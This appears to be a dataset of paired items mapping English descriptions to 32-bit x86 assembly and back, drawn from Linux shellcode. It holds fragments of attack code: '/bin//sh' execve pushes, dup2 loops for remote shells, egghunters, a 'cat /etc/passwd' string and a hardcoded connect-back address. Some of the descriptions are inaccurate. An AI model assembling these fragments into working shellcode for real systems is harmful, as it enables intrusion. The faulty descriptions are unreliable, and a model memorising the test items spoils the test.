ShellCodeGen: push the edi onto the stack,push edi
ShellCodeGen: if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label,"cmp dx, 0x03e8 \n je L1"
"ShellCodeSum: push dword 0x39396e2d \n mov ebx, esp",push double word 0x39396e2d onto the stack and point the ebx register to the stack register
ShellCodeSum: push ecx,push ecx on the stack
ShellCodeGen: make the system call fork,"mov eax, 2"
ShellCodeGen: jump short to the get label,jmp short get
ShellCodeGen: jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \n jnz _start \n jmp edi
ShellCodeGen: restore the top of the stack into the eax register,pop eax
ShellCodeSum: inc esi,increment esi
ShellCodeGen: move 0x2f into the byte at address [esp],"mov byte [esp], 0x2f"
ShellCodeGen: define the _child label,_child:
ShellCodeGen: set the eax register to null,"xor eax, eax"
ShellCodeGen: add 48 to eax,"add eax, 48"
ShellCodeGen: define shellcodelen equal to the length shellcode,shellcodelen equ $-shellcode
ShellCodeSum: push 0x204c4c41,push the 0x204c4c41 onto the stack
ShellCodeGen: push the doubleword ebx to the stack,push dword ebx
"ShellCodeSum: mov al, 5",move 5 into al
ShellCodeSum: push 0x66,push 0x66 onto the stack
ShellCodeGen: push the 4 bytes at address var onto the stack,push [var]
ShellCodeGen: push the contents of the edx register onto the stack,push edx
"ShellCodeSum: cmp dl, 27 \n jge l3",if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3
"ShellCodeSum: mov long [esi+22], ebx",move the contents of the ebx register into the long starting at the address [esi+22]
"ShellCodeSum: mov ecx, [ebp+12]",move the contents of the address [ebp+12] into ecx
ShellCodeGen: increment dl,inc dl
ShellCodeGen: set the new base pointer,"mov ebp, esp"
ShellCodeGen: push the word 0x692d onto the stack,push word 0x692d
ShellCodeGen: compare if eax is equal to 0,"cmp eax, 0"
ShellCodeGen: push the dword 0x2f2f6e69 onto the stack,push dword 0x2f2f6e69
ShellCodeGen: move decimal value 10 into ebx,"mov ebx, 10"
ShellCodeGen: push 0x6475732f to the stack,push 0x6475732f
ShellCodeSum: jz download,jump to download if zero
ShellCodeSum: path db '//bin/sh',define the byte string path and initialize it to '//bin/sh'
ShellCodeGen: make the system call to get information about the file,"mov eax, 106"
ShellCodeGen: jump to the value stored in the eax register,jmp eax
ShellCodeSum: inc edi,increment the contents of the edi register
"ShellCodeSum: test eax, eax \n jnz l4 \n call search",if the contents of the eax register is not zero then jump to the label l4 else call the function search
ShellCodeGen: push the contents of esi register onto the stack,push esi
ShellCodeGen: zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register,"xor eax, eax \n cmp edx, eax \n jne l3"
ShellCodeGen: make the system call to go to the file offset,"mov eax, 19"
ShellCodeSum: scasd,compare the contents of the eax register with doubleword at edi and set status flags
ShellCodeSum: push esi,push the contents of the esi register onto the stack.
ShellCodeGen: execve,"mov eax, 11"
"ShellCodeSum: mov ecx, esp",ecx point to the top of the stack
ShellCodeSum: _execline:,define the _execline label
ShellCodeGen: move the byte at the address 3fh into al,"mov al, byte 3fh"
ShellCodeGen: declare the execute label,execute:
"ShellCodeSum: xor bx, bx",clear the bx register
"ShellCodeSum: mov edx, 0x1234567",move the value 0x1234567 into the edx register
ShellCodeGen: push the dword 0x6e69622f onto the stack,push dword 0x6e69622f
ShellCodeSum: shellcodelen equ $-shellcode,define shellcodelen equal to the length of shellcode
"ShellCodeSum: mov eax, 5",make the system call open
"ShellCodeSum: add eax, 0x2d383638",add 0x2d383638 to the contents in eax and save the result in eax
"ShellCodeSum: sub ecx, 1",decrease ecx by 1
ShellCodeGen: pop the value on the stack back into dx,pop dx
ShellCodeGen: add 0x2f2f to the contents in dx and save the result in dx,"add dx, 0x2f2f"
"ShellCodeSum: cmp dx, 0x03e8 \n je L1",jump to the L1 label if the contents of the dx register is equal to the value 0x03e8
ShellCodeGen: test the value of eax,"test eax, eax"
ShellCodeSum: push word 0xffff,push the word 0xffff to the stack
ShellCodeGen: move the byte at the address [esi] into al,"mov al, byte [esi]"
"ShellCodeSum: mov byte [esi], bl",move bl into the byte at address [esi]
"ShellCodeSum: mov eax, 2",invoke sys_fork
ShellCodeSum: word3 word ?,define word3 uninitialized unsigned word
"ShellCodeSum: mov [bp+0x36], bx",move the contents of the bx register at the memory location specified by the operation [bp+0x36]
"ShellCodeSum: lea ebx, [esi+23]",load the effective address of the result of the operation [esi+23] into the ebx register
"ShellCodeSum: cmp word [ecx], 0x5951",compare the word at the address ecx and 0x5951
ShellCodeGen: if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D,"cmp bl, 78h \n jg short loc_402B1D"
"ShellCodeSum: cmp byte [ebp+ecx], 61h",compare the byte at the memory location ebp+ecx with 61h
ShellCodeGen: move 4 to the eax register,"mov eax, 4"
ShellCodeGen: jump short to shellcode,jmp short shellcode
"ShellCodeSum: mov bl, 0x5",move 0x5 into bl
ShellCodeGen: put the syscall 0x77 into the eax register,push byte 0x77 \n pop eax
"ShellCodeSum: lea ebx, [ebp+24]",load the effective address of the result of the operation [ebp+24] into the ebx register
ShellCodeGen: jump short to call_shellcode,jmp short call_shellcode
ShellCodeGen: jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label,"cmp BYTE [edx], 0x2e \n jne l2 \n jmp while"
ShellCodeSum: call jmp_search,call the jmp_search function
ShellCodeGen: move bufflen into edx,"mov edx, bufflen"
ShellCodeSum: jmp short _cmd,jump short to the _cmd label
ShellCodeGen: declare .text section,section .text
ShellCodeGen: move m_src4 to edx,"mov edx, m_src4"
ShellCodeGen: decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register,loop eggLoop \n jmp edi
"ShellCodeSum: mov cx, 0x5309",move 0x5309 into cx
ShellCodeSum: push dword 0x776f6461,push the dword 0x776f6461 onto the stack
ShellCodeGen: declare the jocker label,jocker:
ShellCodeSum: push byte 0,push byte 0 onto stack
"ShellCodeSum: cmp BYTE [esi], 0x7 \n jle lowbound",if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label
ShellCodeGen: subtract the contents of ax from the contents of ax,"sub ax, ax"
ShellCodeGen: push 0x7372656f onto the stack,push 0x7372656f
ShellCodeSum: push byte 0x02,push the byte 0x02 to the stack
ShellCodeGen: move the contents at memory address temp1 to eax,"mov eax, [temp1]"
ShellCodeGen: move decimal 2 into edx,"mov edx, 2"
ShellCodeGen: load the effective address of the result of the operation [esi+13] into the ebx register,"lea ebx, [esi+13]"
ShellCodeGen: push the value of register ecx onto the stack,push ecx
ShellCodeSum: 1:,define the numeric label 1
"ShellCodeSum: mov edx, 43",move 43 decimal into edx
ShellCodeGen: declare the duploop label,duploop:
"ShellCodeSum: mov al, 0x33",move 0x33 into al
ShellCodeGen: if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label,"cmp ax, bx \n jne l3"
"ShellCodeSum: cmp bh, al",compare the contents of bh and the contents of al
ShellCodeGen: jump to the one label,jmp one
"ShellCodeSum: cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193",jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register
"ShellCodeSum: xchg eax, edx",swap the contents of the eax register with the contents of the edx register
ShellCodeGen: decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register,"loop l1 \n mov eax, esp"
"ShellCodeSum: push 0x6374652f \n mov ebx, esp",push the value 0x6374652f onto the stack and point ebx to the stack register
ShellCodeGen: push the 0x4f4e2029 onto the stack,push 0x4f4e2029
ShellCodeGen: move 0x563ed8b7 into eax,"mov eax, 0x563ed8b7"
ShellCodeGen: reserve 1 byte for variableName1,variablename1: resb 1
ShellCodeGen: compare the dword at the address [eax] and the contents of the ebx register,"cmp dword [eax], ebx"
ShellCodeGen: put the syscall 0x5 into the al register,"mov al, 0x05"
ShellCodeSum: decode:,define decode function
ShellCodeGen: move the value 0x301 into the cx register,"mov cx, 0x301"
ShellCodeGen: push the byte 0x66 onto the stack,push byte 0x66
ShellCodeGen: push the word 0x6f64 onto the stack,push word 0x6f64
"ShellCodeSum: cmp ebp, 0",compare the contents of the ebp register with the value 0
ShellCodeSum: push 0x2e312e31,push 0x2e312e31 onto the stack
ShellCodeGen: jump to the next_addr label if the operands of the above comparison are not equals,jne next_addr
"ShellCodeSum: mov eax, 10",invoke sys_unlink
ShellCodeSum: string: db '/bin/sh',define string as the byte string '/bin/sh'
ShellCodeGen: declare section containing initialized data,section .data
ShellCodeSum: push 0x6962732f,push the 0x6962732f onto the stack
ShellCodeGen: decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero,loop up
ShellCodeSum: nop,do no operation
"ShellCodeSum: sub cx, cx",subtract the contents of cx from the contents of cx
"ShellCodeSum: mov eax, [y]",move the contents at memory address y to eax
ShellCodeGen: define name as the byte string '/bin/sh',"name db '/bin/sh', 0"
"ShellCodeSum: mov eax, 106",make the system call to get information about the file
ShellCodeGen: push the 0x5 onto the stack,push 0x5
ShellCodeGen: move the address of msg2 into eax,"mov eax, msg2"
ShellCodeGen: jump to the shellcode label if the contents of the bl register is equal to the value 0xaa,"cmp bl, 0xaa \n je shellcode"
"ShellCodeSum: add ax, [di + 20]",add memory[di + 20] to ax
ShellCodeSum: push 0xa,push 0xa onto the stack
"ShellCodeSum: lea dx, [bp+di+0x3e]",load the effective address of the operation [bp+di+0x3e] into the dx register
"ShellCodeSum: mov cl, 10 \n dec cl \n jnz l1",move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero
ShellCodeGen: move 0x14 into dl,"mov dl,0x14"
ShellCodeSum: _close:,define the _close label
"ShellCodeSum: add ebx, 16",add 16 to ebx
ShellCodeGen: swap the contents of eax and esi,"xchg eax, esi"
ShellCodeGen: if zero jump to the next_cycle label,jz next_cycle
ShellCodeGen: move 2 into the single byte at memory location ecx,"mov byte [ecx], 2"
"ShellCodeSum: cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193",if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register
ShellCodeSum: push ecx,push the contents of ecx register onto the stack
ShellCodeGen: push 0x8 onto the stack,push 0x8
ShellCodeGen: move 1222 into dx,"mov dx, 1222"
ShellCodeGen: move the contents of the eax register into the long starting at the address [esi+26],"mov long [esi+26], eax"
ShellCodeGen: add 0x2 to the contents in ebx and save the result in ebx,"add ebx, 0x2"
ShellCodeGen: push the sock_reg onto the stack,push sock_reg
"ShellCodeSum: mov eax, 19",invoke sys_lseek
ShellCodeGen: move the single byte in esi into dl,"mov dl, byte [esi]"
"ShellCodeSum: lea esi, [ebp+20]",load the effective address of the result of the operation [ebp+20] into the esi register
"ShellCodeSum: lea eax, [var]",place the address of var in eax
ShellCodeGen: exchange ebx with ecx,"xchg ebx, ecx"
"ShellCodeSum: loop main_push \n mov cl, 30",decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register
ShellCodeGen: jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register,"cmp edx, ebx \n je 0x8 \n"
"ShellCodeSum: xor ebx, ebx",clear the ebx register
ShellCodeSum: jmp fupdisasm+1,jump to the address specified by the operation fupdisasm+1
ShellCodeGen: move esp into edi,"mov edi, esp"
ShellCodeSum: push byte 0x30,push the byte 0x30 onto the stack
"ShellCodeSum: cmp eax, edi \n jne infinite \n xor eax, eax",jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register
"ShellCodeSum: cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax",jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
ShellCodeGen: push 0x78 onto the stack,push 0x78
ShellCodeGen: move the address in eax into ebx,"mov ebx, eax"
ShellCodeSum: section .text,declare the text section
"ShellCodeSum: mov edi, 884021143",move 884021143 into edi
"ShellCodeSum: mov ax, [esi]",move esi into ex
ShellCodeGen: jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register,"test eax, eax \n jz close \n mov ebx, edx"
ShellCodeSum: push 0x6374652f,push 0x6374652f to the stack
ShellCodeSum: jmp short decode_pr,jump short to the decode_pr label
ShellCodeGen: move 83 into the byte at address al,"mov byte al, 83"
ShellCodeGen: push the double word 0x313a303a onto the stack,push dword 0x313a303a
ShellCodeGen: move the byte 3fh into al,"mov al, byte 3fh"
ShellCodeGen: declare the call_shellcode label,call_shellcode:
ShellCodeGen: jump short to push_cmd,jmp short push_cmd
"ShellCodeSum: cmp eax, eax \n jne 0x8 \n xor eax, eax",if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register
"ShellCodeSum: mov ebp, esp",set the new base pointer
ShellCodeGen: clear the edx register,"xor edx, edx"
ShellCodeGen: restore the top of the stack into the ecx register,pop ecx
ShellCodeGen: jump to duploop if not negative,jns duploop
ShellCodeSum: push byte 0x77,push the byte 0x77 onto the stack
ShellCodeGen: dup2,"mov eax, 63"
ShellCodeGen: move the address in ebx into eax,"mov eax, ebx"
ShellCodeGen: move dl into the address [ebx + 6],"mov [ebx + 6], dl"
ShellCodeGen: move edx into edi,"mov edi, edx"
"ShellCodeSum: sub eax, 0x3217d6d2",subtract 0x3217d6d2 from the contents in eax and save the result in eax
"ShellCodeSum: filename: db 'readme.txt', 0h",create a string filename and initialize to 'readme.txt'
"ShellCodeSum: and ebx, 0000000fh",mask out lowest 4 bits of the ebx register
ShellCodeGen: if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register,"cmp dl, cl \n jb l1 \n mov al, 0x39"
ShellCodeGen: add the contents of the eax register to the contents of esi register,"add esi, eax"
ShellCodeGen: move the contents of the bx register at the memory location specified by the operation [bp+0x36],"mov [bp+0x36], bx"
ShellCodeSum: call write,call the write function
ShellCodeSum: cmd: db 'cat /etc/passwd',declare cmd string and initialize it to 'cat /etc/passwd'
"ShellCodeSum: cmp dx, 0x03e8 \n je L1",if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label
ShellCodeSum: rotate:,declare the rotate label
ShellCodeGen: push 0x7273752f onto the stack,push 0x7273752f
ShellCodeGen: move bl into byte edx+eax,"mov byte [edx+eax], bl"
ShellCodeGen: perform or operation between dx and 0xfff and save the result into dx,"or dx, 0xfff"
ShellCodeGen: move the contents of the si register at the memory location specified by the operation [bp+0x32],"mov [bp+0x32], si"
"ShellCodeSum: mov eax, 27",set signal delivery alarm clock
"ShellCodeSum: mov [bp+0x32], si",move the contents of the si register at the memory location specified by the operation [bp+0x32]
"ShellCodeSum: push 0x6475732f \n push 0x6374652f \n mov ecx, esp",push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
ShellCodeSum: dec ecx \n jns dup2loop,decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative
ShellCodeGen: create label main_push,main_push:
ShellCodeGen: push the byte 0x2 onto the stack and point ecx to the stack register,"push byte 0x2 \n mov ecx, esp"
ShellCodeGen: push the double word 0x2f3a2f3a onto the stack,push dword 0x2f3a2f3a
ShellCodeSum: push 0x706d742f,push the 0x706d742f onto the stack
ShellCodeGen: move 0x3 into cl,"mov cl, 0x3"
ShellCodeGen: jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero,"xor bl, 0xBB \n jz formatting"
ShellCodeGen: push 0x6d726574 onto the stack,push 0x6d726574
ShellCodeGen: move the singl byte at the memory location speicified by the operation [esi+1] into dl,"mov dl, byte [esi + 1]"
ShellCodeSum: push byte 0x3 \n pop eax,put the syscall 0x3 into the eax register
ShellCodeSum: string: db '/etc/passwd',define string as the byte string '/etc/passwd'
ShellCodeGen: push the value 0x64687373 onto the stack and point the ecx register to the stack register,"push 0x64687373 \n mov ecx, esp"
ShellCodeSum: dec eax,decrement the contents of the eax register
ShellCodeSum: _param:,define the _param label
ShellCodeSum: push 0x61655220,push 0x61655220 onto the stack
ShellCodeGen: move the first element of array into ecx,"mov ecx, array"
"ShellCodeSum: mov cl, al",move al into cl
ShellCodeGen: extend the sign bit of the eax register into the edx register,cdq
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label,"cmp byte [esi], 0xD \n jle wrap_around"
"ShellCodeSum: xor esi, esi",initialize the esi register with the decimal value 0
"ShellCodeSum: mov eax, msg1",move msg1 string into eax
ShellCodeGen: move the contents of the bx register at the memory location specified by the operation [bp+0x3a],"mov [bp+0x3a], bx"
ShellCodeGen: push the ebx value to the stack,push ebx
"ShellCodeSum: xor edx, edx",initialize edx with the decimal value 0
ShellCodeGen: store 4 into al,"mov al, 4"
ShellCodeGen: push ASCII /bin/sh onto the stack and point the ebx register to the stack register,"push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeGen: put the syscall 0x8 into the al register,"mov al, 0x8"
ShellCodeSum: encrypt:,declare the encrypt label
"ShellCodeSum: shr ebx, cl",right shift the contents of the ebx register by the contents of the cl register
"ShellCodeSum: lea esi, [ebp+20]",load the effective address [ebp+20] into esi
ShellCodeGen: remove last character from the stack into eax,pop eax
ShellCodeSum: push ebx,push the contents of the ebx register onto the stack
"ShellCodeSum: mov ecx, request",move address of request variable into ecx
ShellCodeGen: subtract 0x7ff from the contents in cx and save the result in cx,"sub cx, 0x7ff"
"ShellCodeSum: push byte 0x5 \n mov ebx, esp",push the byte 0x5 onto the stack and point ebx to the stack register
ShellCodeGen: define the byte value byte_value and initialize it to 150,byte_value db 150
ShellCodeSum: jmp short decode,jump short to the decode label
ShellCodeGen: jump to next label if the destination is greater than the source in the above comparison,ja next
"ShellCodeSum: push 0x64687373 \n mov edi, esp",push the value 0x64687373 onto the stack and point the edi register to the stack register
ShellCodeGen: jump to incpage if equal,jz incpage
ShellCodeGen: put the syscall 3h into the eax register,push byte 3h \n pop eax
"ShellCodeSum: cmp cl, 0x3 \n jne loop2",if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label
"ShellCodeSum: xor edx, edx",reset edx to 0
ShellCodeGen: negate all the bits of the word at the address ax,not word ax
ShellCodeSum: push 0x2,push 0x2 onto the stack
"ShellCodeSum: add ebx, 2",add 2 to the contents of the ebx register
ShellCodeSum: not edi,negate all the bits of the edi register
ShellCodeGen: declare the init label,init:
ShellCodeGen: jump to label child if the zero flag is set,jz child
"ShellCodeSum: sub ecx, ecx",subtract the contents of ecx from the contents of ecx
"ShellCodeSum: mov al, 0x3f",move 0x3f into al
"ShellCodeSum: mov cx, 2001",move 2001 into cx
ShellCodeGen: place the value in var in eax,"lea eax, [var]"
ShellCodeSum: push byte 8,push the byte 8 onto the stack
ShellCodeSum: je short loc_402b13,jump to loc_402b13 if equal
ShellCodeGen: push $0x68732f2f onto the stack,pushl $0x68732f2f
"ShellCodeSum: lea ecx, [esi + 8]",load the effective address of the result of the operation [esi + 8] into the ecx register
ShellCodeGen: if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8,"cmp eax, eax \n jne 0x8"
"ShellCodeSum: mov ebx, [ebp-8]",move the contents of the address [ebp-8] into the ebx register
ShellCodeGen: zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register,"xor ebx, ebx \n cmp eax, ebx \n jne exit"
ShellCodeGen: subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative,"sub al, 1 \n jns l1"
ShellCodeGen: move the contents of ebx into the 4 bytes at memory address var,"mov [var], ebx"
ShellCodeGen: declare a byte containing the value 64 at label the memory location var,var db 64
ShellCodeGen: add 40000h to eax register,"add eax, 40000h"
"ShellCodeSum: xchg eax, ebx",swap the contents of eax and ebx
ShellCodeGen: jump short to the decode label,jmp short decode
ShellCodeGen: reserve a variable filename of 255 bytes,filename: resb 255
ShellCodeGen: perform the xor operation between the ax register and the value 0x3041,"xor ax, 0x3041"
ShellCodeSum: cld,set the direction flag to zero
ShellCodeGen: declare an uninitialized byte labeled var2,var2 db ?
"ShellCodeSum: mov eax, 4",write
ShellCodeSum: main_push:,declare the main_push label
"ShellCodeSum: xor ebx, ebx",init ebx 0
ShellCodeSum: loop do_dup \n push byte 0x3f,decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack
"ShellCodeSum: cmp ecx, 10",compare if ecx is equal to 10
ShellCodeGen: decrement the esp register by one,dec esp
"ShellCodeSum: push dword 0x74652f2f \n mov esi, esp",push double word 0x74652f2f onto the stack and point the esi register to the stack register
"ShellCodeSum: mov eax, 11",invoke sys_execve
ShellCodeSum: _child:,define the _child label
"ShellCodeSum: mov eax, 65",make the system call getpgrp
ShellCodeGen: declare cmd string and initialize it to 'cat /etc/passwd',cmd: db 'cat /etc/passwd'
ShellCodeGen: reserve an array of ten reals for realarray,realarray resq 10
ShellCodeGen: define the _param label,_param:
ShellCodeGen: move 10000h into eax register,"mov eax, 10000h"
ShellCodeGen: allocate memory for the marks array of words and initialize all elements to zero,"marks dw 0, 0, 0, 0"
"ShellCodeSum: sub edx, 4",decrease edx by 4
ShellCodeGen: push 'sswd' onto the stack,push 'sswd'
"ShellCodeSum: mov al, byte 0x1",move the byte at the address 0x1 into al
ShellCodeGen: move 0x3f into the byte in al,"mov byte al, 0x3f"
ShellCodeGen: load the effective address [ebp+20] into esi,"lea esi, [ebp+20]"
ShellCodeGen: increment the address in eax by one byte,inc eax
ShellCodeGen: move the byte at the address [eax] into cl,"mov cl, byte [eax]"
ShellCodeGen: define the _continue label,_continue:
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov edx, esp"
"ShellCodeSum: mov dx, 16666",move 16666 into dx
"ShellCodeSum: lea eax, [zero_reg+6]",load the effective address [zero_reg+6] into eax
ShellCodeGen: push the doubleword 0x61747069 to the stack,push dword 0x61747069
ShellCodeGen: if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label,"cmp al, 0xf2 \n je fillOnes"
ShellCodeGen: move 0x8 into bl,"mov bl, 0x8"
ShellCodeSum: push 0x203a4457,push 0x203a4457 onto the stack
ShellCodeSum: egghunter:,declare the egghunter label
"ShellCodeSum: mov esi, 0x68732f2f",move 0x68732f2f into esi
ShellCodeGen: push the word 0x632d to the stack,push word 0x632d
"ShellCodeSum: sub dl, al",subtract the contents of al register from the contents of dl register and save the result in dl
"ShellCodeSum: xchg eax, ecx",swap the contents of the eax register with the contents of the ecx register
ShellCodeGen: move bl into the single byte at the address stored in esi+ecx,"mov byte [esi+ecx], bl"
ShellCodeGen: move the value two into eax,"mov eax, 2"
ShellCodeGen: make the system call to map the memory page to a file,"mov eax, 90"
ShellCodeGen: declare a byte and initialize it to 0x80,db 0x80
ShellCodeGen: move al into the address [esi+13],"mov [esi+13], al"
ShellCodeGen: subtract 0x41 from the al register,"sub al, 0x41"
ShellCodeSum: je connec,jump to connect if equal
ShellCodeGen: subtract the contents of bx register by 1663 and save the result in bx,"sub bx, 1663"
ShellCodeGen: put the syscall 0x4 into the eax register,push byte 0x4 \n pop eax
ShellCodeGen: make the system call kill,"mov eax, 37"
ShellCodeSum: push 0x2f2f2f2f,push 0x2f2f2f2f to the stack
"ShellCodeSum: mov esi, 9",move 9 into esi
ShellCodeGen: push the byte 67 onto the stack,push byte 67
"ShellCodeSum: test eax, eax",test the value of eax
ShellCodeGen: subtract 0x2c3d2dff from the contents in eax and save the result in eax,"sub eax, 0x2c3d2dff"
ShellCodeSum: call_decoded:,define the call_decoded label
ShellCodeGen: jump short to the push_cmd label,jmp short push_cmd
ShellCodeGen: move ecx into the address [ebp+12],"mov [ebp+12], ecx"
ShellCodeSum: all:,define the all label
ShellCodeGen: move the contents of esp into ecx,"mov ecx, [esp]"
ShellCodeGen: call the loader function,call loader
ShellCodeGen: jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi,scasd \n jnz IncAddr
ShellCodeGen: jump to the _while_loop if lower,jl _while_loop
ShellCodeSum: jz next_page,jump to next_page if zero
ShellCodeSum: pop edi,pop the top element of the stack into edi
ShellCodeGen: move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx,"mov word [ecx], 2"
ShellCodeGen: decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0,dec ecx \n jns dup2loop
ShellCodeGen: if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register,"test eax, eax \n jz socket \n xor eax, eax"
"ShellCodeSum: lea eax, [zero_reg+66h]",load the effective address of the result of the operation [zero_reg+66h] into the eax register
"ShellCodeSum: lea ecx, [zero_reg+3]",load the effective address [zero_reg+3] into ecx
ShellCodeGen: transfer ebx to eax,"mov eax, ebx"
"ShellCodeSum: cmp bl, 78h \n jle short loc_402B1D",jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h
"ShellCodeSum: mov ebx, 0x1",move 0x1 into ebx
ShellCodeGen: move the contents at memory address temp4 to edx,"mov edx, [temp4]"
ShellCodeGen: push eax on the stack,push eax
ShellCodeGen: push edx on the stack,push edx
ShellCodeSum: push 0x6,push the 0x6 value onto the stack
ShellCodeGen: move 0x7f into the byte at address [esp],"mov byte [esp], 0x7f"
ShellCodeGen: move the byte at the address [eax + 1] into dl,"mov dl, byte [eax + 1]"
ShellCodeGen: jump to the label not_found if the contents of the bl register is not zero,"test bl, bl \n jz not_found"
ShellCodeGen: push eax onto stack,push eax
ShellCodeGen: move addr into eax,"mov eax, addr"
"ShellCodeSum: add al, 0x3",add 0x3 to the contents in al and save the result in al
ShellCodeSum: real_number2 dd 123456,define the doubleword variable real_number2 and initialize 123456
ShellCodeSum: execfile:,define execfile function
"ShellCodeSum: sub cl, dl",subtract the contents of dl register from the contents of cl register and save the result in cl
ShellCodeSum: push 0x8501a8c0,push 0x8501a8c0 onto the stack
"ShellCodeSum: mov ebx, 2",specify file descriptor 2 standard error
ShellCodeGen: push the byte 0x5 onto the stack and point edx to the stack register,"push byte 0x5 \n mov edx, esp"
ShellCodeGen: move zero_reg into the address [ebp+20],"mov [ebp+20], zero_reg"
ShellCodeSum: call shellcode,call the shellcode function
ShellCodeGen: perform and operation between eax and 3f465456 and save the result in eax,"and eax, 3f465456"
"ShellCodeSum: lea ecx, [esi+35]",load the effective address of the result of the operation [esi+35] into the ecx register
ShellCodeSum: set_argv:,declare the set_argv label
ShellCodeGen: push ax to the stack,push ax
ShellCodeSum: push word bx,push the word bx onto the stack
ShellCodeGen: push sock_reg onto the stack,push sock_reg
ShellCodeGen: move 0x1 into ecx,"mov ecx, 0x1"
ShellCodeGen: move 0xb01 into dx,"mov dx, 0xb01"
ShellCodeGen: move address of request variable into ebx,"mov ebx, request"
"ShellCodeSum: mov esp, ebp",move the contents of the ebp register into the esp register
ShellCodeSum: db 0x68,declare a byte contining 0x68
ShellCodeSum: push 0x1a,push 0x1a to the stack
ShellCodeSum: push 0x3458652e,push 0x3458652e onto the stack
ShellCodeGen: load the effective address of the result of the operation [ebp+28] into the ecx register,"lea ecx, [ebp+28]"
ShellCodeGen: specify file descriptor 0 as standard input,"mov ebx, 0"
ShellCodeGen: push 0x6c626174 onto the stack,push 0x6c626174
ShellCodeGen: move 0x02 into dl,"mov dl, 0x02"
"ShellCodeSum: mov cl, byte_table[2]",move the 3rd element of the array byte_table into cl
ShellCodeGen: push the byte 0x01 to the stack,push byte 0x01
"ShellCodeSum: cmp al, bl \n ja l2 \n add eax, 3",jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register
ShellCodeSum: jnz short _parent,jump short to the _parent label if the zero flag is cleared
ShellCodeSum: call atoi,call the atoi function
ShellCodeGen: system call getpgrp,"mov eax, 65"
ShellCodeGen: move the value 0x735f6176 into the double word starting at the address [esp-0xc],"mov dword [esp-0xc], 0x735f6176"
ShellCodeSum: push word 0xffff,push the word 0xffff onto the stack
"ShellCodeSum: sub cl, bl \n jns l3",subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative
"ShellCodeSum: mov edi, esi",move esi into edi
ShellCodeGen: subtract 20h from the 8-bit at memory location ebp+ecx,"sub byte [ebp+ecx],20h"
ShellCodeGen: extend the sign bit of eax register into the edx register,cdq
"ShellCodeSum: mov ecx, esp",save the memory location of arg[0] into the ecx register
ShellCodeGen: load the effective address [zero_reg+6] into eax,"lea eax, [zero_reg+6]"
ShellCodeGen: move the byte 0eh into bl,"mov bl, byte 0eh"
"ShellCodeSum: sub dl, byte [esi]",subtract the byte at the address esi from the contents of the dl register
ShellCodeGen: push 0x7361702f onto the stack,push 0x7361702f
ShellCodeSum: push byte +0x2,push the byte +0x2 onto the stack
ShellCodeGen: right shift by 4 bits bl,"shr bl,4"
ShellCodeSum: _write:,define the _write label
ShellCodeGen: right shift the contents of bl register by 4 bit positions,"shr bl, 4"
ShellCodeSum: ret,return to our program
ShellCodeGen: move buff to ecx,"mov ecx, buff"
ShellCodeSum: push 0x78,push 0x78 onto the stack
ShellCodeGen: initialize the esi register with the decimal value 0,"xor esi, esi"
"ShellCodeSum: test eax, eax \n jnz l1",jump to the label l1 if the contents of the eax register is not zero
"ShellCodeSum: mov al, 0x4",move the value 0x4 into the al register
ShellCodeSum: push byte 49 \n pop eax,put the syscall 49 into the eax register
"ShellCodeSum: push word 0x632d \n mov ebx, esp",push the word 0x632d onto the stack and point the ebx register to the stack register
ShellCodeGen: push double word 0x74652f2f onto the stack and point the eax register to the stack register,"push dword 0x74652f2f \n mov eax, esp"
"ShellCodeSum: push 0x64687373 \n mov edx, esp",push the value 0x64687373 onto the stack and point the edx register to the stack register
ShellCodeGen: move 0x978cd092 into edi,"mov edi, 0x978cd092"
ShellCodeSum: push byte 0x2e \n pop eax,put the syscall 0x2e into the eax register
